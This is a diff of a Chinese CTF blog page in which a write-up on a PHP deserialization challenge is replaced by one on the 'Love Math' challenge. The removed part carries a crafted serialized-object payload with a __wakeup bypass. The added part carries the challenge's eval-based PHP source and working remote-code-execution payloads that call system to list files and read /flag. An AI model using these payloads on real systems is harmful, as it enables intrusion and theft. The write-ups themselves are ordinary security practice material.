@@ -7,32 +7,24 @@
   
   
   
-  <title>20-Buu练习[极客大挑战 2019]PHP1 | baba童鞋的博客</title>
+  <title>Love Math | baba童鞋的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="知识点  1：用dirsearch扫描备份文件安装及使用教程参见：https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43459870&#x2F;article&#x2F;details&#x2F;1025213862：public、protected与private在序列化时的区别  protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字">
+  <meta name="description" content="题目描述：  这是一道php代码审计的题跟rce有关。让我们来看一下源码吧：">
 <meta property="og:type" content="article">
-<meta property="og:title" content="20-Buu练习[极客大挑战 2019]PHP1">
-<meta property="og:url" content="http://example.com/2021/02/07/zip/index.html">
+<meta property="og:title" content="Love Math">
+<meta property="og:url" content="http://example.com/2021/04/28/math/index.html">
 <meta property="og:site_name" content="baba童鞋的博客">
-<meta property="og:description" content="知识点  1：用dirsearch扫描备份文件安装及使用教程参见：https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43459870&#x2F;article&#x2F;details&#x2F;1025213862：public、protected与private在序列化时的区别  protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字">
+<meta property="og:description" content="题目描述：  这是一道php代码审计的题跟rce有关。让我们来看一下源码吧：">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2021/02/07/zip/zip0.png">
-<meta property="og:image" content="http://example.com/2021/02/07/zip/zip3.png">
-<meta property="og:image" content="http://example.com/2021/02/07/zip/zip2.png">
-<meta property="og:image" content="http://example.com/2021/02/07/zip/zip1.png">
-<meta property="og:image" content="http://example.com/2021/02/07/zip/zip4.png">
-<meta property="og:image" content="http://example.com/2021/02/07/zip/zip5.png">
-<meta property="og:image" content="http://example.com/2021/02/07/zip/zip6.png">
-<meta property="og:image" content="http://example.com/2021/02/07/zip/zip7.png">
-<meta property="og:image" content="http://example.com/2021/02/07/zip/zip8.png">
-<meta property="og:image" content="http://example.com/2021/02/07/zip/zip9.png">
-<meta property="og:image" content="http://example.com/2021/02/07/zip/zip10.png">
-<meta property="article:published_time" content="2021-02-07T05:49:18.000Z">
-<meta property="article:modified_time" content="2021-02-07T06:26:27.307Z">
+<meta property="og:image" content="http://example.com/2021/04/28/math/1.png">
+<meta property="og:image" content="http://example.com/2021/04/28/math/2.png">
+<meta property="og:image" content="http://example.com/2021/04/28/math/3.png">
+<meta property="article:published_time" content="2021-04-28T13:41:06.000Z">
+<meta property="article:modified_time" content="2021-04-28T14:00:44.636Z">
 <meta property="article:author" content="Jialu">
 <meta property="article:tag" content="ctf web 霸霸">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/02/07/zip/zip0.png">
+<meta name="twitter:image" content="http://example.com/2021/04/28/math/1.png">
   
     <link rel="alternative" href="/atom.xml" title="baba童鞋的博客" type="application/atom+xml">
   
@@ -286,11 +278,11 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-zip" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-math" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2021/02/07/zip/" class="article-date">
-      <time datetime="2021-02-07T05:49:18.000Z" itemprop="datePublished">2021-02-07</time>
+      <a  href="/2021/04/28/math/" class="article-date">
+      <time datetime="2021-04-28T13:41:06.000Z" itemprop="datePublished">2021-04-28</time>
 </a>
 
     </div>
@@ -304,7 +296,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      20-Buu练习[极客大挑战 2019]PHP1
+      Love Math
     </h1>
   
 
@@ -322,30 +314,56 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2>知识点</h2>
+        <h2>题目描述：</h2>
 
-<p><b style="color:pink">1：用dirsearch扫描备份文件</b><br>安装及使用教程参见：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43459870/article/details/102521386">https://blog.csdn.net/weixin_43459870/article/details/102521386</a><br><b style="color:pink">2：public、protected与private在序列化时的区别</b></p>
-<ul>
-<li>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0*\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0*\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。
-</li><li>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。
-</li></ul>
+<p><img src="/2021/04/28/math/1.png"><br>这是一道php代码审计的题<br>跟rce有关。让我们来看一下源码吧：</p>
+<a id="more"></a>
+<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//听说你很喜欢数学&#xff0c;不知道你是否爱它胜过爱flag</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">&#39;c&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
+    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;<!-- --></span>
+    <span class="token comment">//例子 c&#61;20-1</span>
+    <span class="token variable">$content</span> <span class="token operator">&#61;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">&#39;c&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">&gt;&#61;</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;<!-- --></span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&#34;太长了不会算&#34;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token variable">$blacklist</span> <span class="token operator">&#61;</span> <span class="token punctuation">[</span><span class="token single-quoted-string string">&#39; &#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;\t&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;\r&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;\n&#39;</span><span class="token punctuation">,</span><span class="token single-quoted-string string">&#39;\&#39;&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;&#34;&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;&#96;&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;\[&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;\]&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;<!-- --></span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">&#39;/&#39;</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">&#39;/m&#39;</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;<!-- --></span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&#34;请不要输入奇奇怪怪的字符&#34;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>
+    <span class="token variable">$whitelist</span> <span class="token operator">&#61;</span> <span class="token punctuation">[</span><span class="token single-quoted-string string">&#39;abs&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;acos&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;acosh&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;asin&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;asinh&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;atan2&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;atan&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;atanh&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;base_convert&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;bindec&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;ceil&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;cos&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;cosh&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;decbin&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;dechex&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;decoct&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;deg2rad&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;exp&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;expm1&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;floor&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;fmod&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;getrandmax&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;hexdec&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;hypot&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;is_finite&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;is_infinite&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;is_nan&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;lcg_value&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;log10&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;log1p&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;log&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;max&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;min&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;mt_getrandmax&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;mt_rand&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;mt_srand&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;octdec&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;pi&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;pow&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;rad2deg&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;rand&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;round&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;sin&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;sinh&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;sqrt&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;srand&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;tan&#39;</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">&#39;tanh&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token single-quoted-string string">&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;<!-- --></span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;<!-- --></span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&#34;请不要输入奇奇怪怪的函数&#34;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token comment">//帮你算出答案</span>
+    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">&#39;echo &#39;</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">.</span><span class="token single-quoted-string string">&#39;;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> 
+</code></pre> 
+<h2>题解</h2>
+能看出来是个构造rce的题，分析过滤后得出可以使用的：白名单中的数学函数，.,^等，同时长度限制在80个字符以内
+审计源码。所包含的php函数如下：
+<ol>
+<li>scandir() 函数：返回指定目录中的文件和目录的数组。
+</li><li>base_convert() 函数：在任意进制之间转换数字。
+</li><li>dechex() 函数：把十进制转换为十六进制。
+</li><li>hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。
+</li><li>var_dump() ：函数用于输出变量的相关信息。
+</li><li>readfile() 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。
+</li></ol>
 
+<p>构造payload：<br><code>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&pi=system&abs=ls%20/</code><br><img src="/2021/04/28/math/2.png"><br><code>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&pi=system&abs=cat%20/flag<br></code><br><img src="/2021/04/28/math/3.png"><br>得到flag！</p>
+<h4>备注：（知识点）</h4>
 
-<p><b style="color:pink">3：__wakeup()方法绕过</b><br>一个经常被用来出题的函数<br>(CVE-2016-7124)<br>作用：与__sleep()函数相反，__sleep()函数，是在序序列化时被自动调用。__wakeup()函数，在反序列化时，被自动调用。绕过：当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。</p>
-<h2>题目</h2>
-
-<p>打开靶场，界面如下：<br><img src="/2021/02/07/zip/zip0.png"><br>根据提示，可知他有一个备份网站的习惯，那我们用dirsearch扫描目录：<br>命令：python dirsearch.py -u URL -e extension<br><img src="/2021/02/07/zip/zip3.png"><br>扫描到一个<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 文件，我们直接在url上输入<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> ，下载该zip文件<br><img src="/2021/02/07/zip/zip2.png"><br><img src="/2021/02/07/zip/zip1.png"><br>index.php包含如下代码:接收参数，进行序列化<br><img src="/2021/02/07/zip/zip4.png"><br>class.php文件源码入下：<br><img src="/2021/02/07/zip/zip5.png"><br>flag.php包含如下代码:<br><img src="/2021/02/07/zip/zip6.png"><br><b>声明一个Name类，包含username,password,且两个变量都是private修饰,整句话都有用。<br>然后根据判断句得知，username必须是admin,password必须是100所以，构造序列化</b></p>
-<ul>
-<li>O是对象，s是字符串，i是数字
-</li><li>因为是private修饰的所以要加%00充当空格
-</li><li>构造:O:4:"Name":2:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
-</li><li>payload：url+?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
-</li></ul>
-
-<p><img src="/2021/02/07/zip/zip7.png"><br>得到flag！</p>
-<h2>菜鸡求学之路</h2> 
-
-<p>看大佬的payload的时候，很疑惑为什么要写%00Name%00username这样的形式？<br>进行了三种修饰方式的测试:public,protected,private<br>只有public修饰的不用太多的修饰原生态构造就好，而private需要加%00Name%00，<br>protected则需要使用 %00*%00username这样的方式<br>——————<br><b>protected修饰变量，运行后回显代码内注释内容</b><br><img src="/2021/02/07/zip/zip8.png"><br><b>public修饰变量，运行后回显代码内注释内容</b><br><img src="/2021/02/07/zip/zip9.png"><br><b>private修饰变量，运行后回显代码内注释内容</b><br><img src="/2021/02/07/zip/zip10.png"></p>
+<p>动态函数<br>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数<br>例如：$function = “sayHello”;$function();</p>
+<p>php中函数名默认为字符串<br>例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择</p>
 
       
     </div>
@@ -354,13 +372,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a  href="/2021/02/07/zip/">20-Buu练习[极客大挑战 2019]PHP1</a></p>
+        <p><span>本文标题:</span><a  href="/2021/04/28/math/">Love Math</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问  的个人博客"></a></p>
-        <p><span>发布时间:</span>2021年02月07日 - 13时49分</p>
-        <p><span>最后更新:</span>2021年02月07日 - 14时26分</p>
+        <p><span>发布时间:</span>2021年04月28日 - 21时41分</p>
+        <p><span>最后更新:</span>2021年04月28日 - 22时00分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2021/02/07/zip/" title="20-Buu练习[极客大挑战 2019]PHP1">http://example.com/2021/02/07/zip/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/02/07/zip/　　作者: " title=""></span>
+            <span>原始链接:</span><a class="post-url" href="/2021/04/28/math/" title="Love Math">http://example.com/2021/04/28/math/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/04/28/math/　　作者: " title=""></span>
         </p>
         <p>
             <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
@@ -371,18 +389,9 @@
 
 <nav id="article-nav">
   
-    <a  href="/2021/02/08/ssrf/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          21-Buu练习[网鼎杯 2018]Fakebook（ssrf漏洞）
-        
-      </div>
-    </a>
   
-  
-    <a  href="/2021/02/05/nizhuansiwei/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">19-buu练习[ZJCTF 2019]NiZhuanSiWei</div>
+    <a  href="/2021/04/23/bgrc/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">日常练习[BJDCTF2020]ZJCTF，不过如此</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -394,7 +403,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">菜鸡求学之路</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">题目描述：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">题解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.0.1.</span> <span class="toc-text">备注：（知识点）</span></a></li></ol></li></ol></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -467,13 +476,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a  href="/2021/02/08/ssrf/" title="上一篇: 21-Buu练习[网鼎杯 2018]Fakebook（ssrf漏洞）">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a  href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a  href="/2021/02/05/nizhuansiwei/" title="下一篇: 19-buu练习[ZJCTF 2019]NiZhuanSiWei">
+            <a  href="/2021/04/23/bgrc/" title="下一篇: 日常练习[BJDCTF2020]ZJCTF，不过如此">
                 <i class="fa fa-angle-right"></i>
             </a>
         
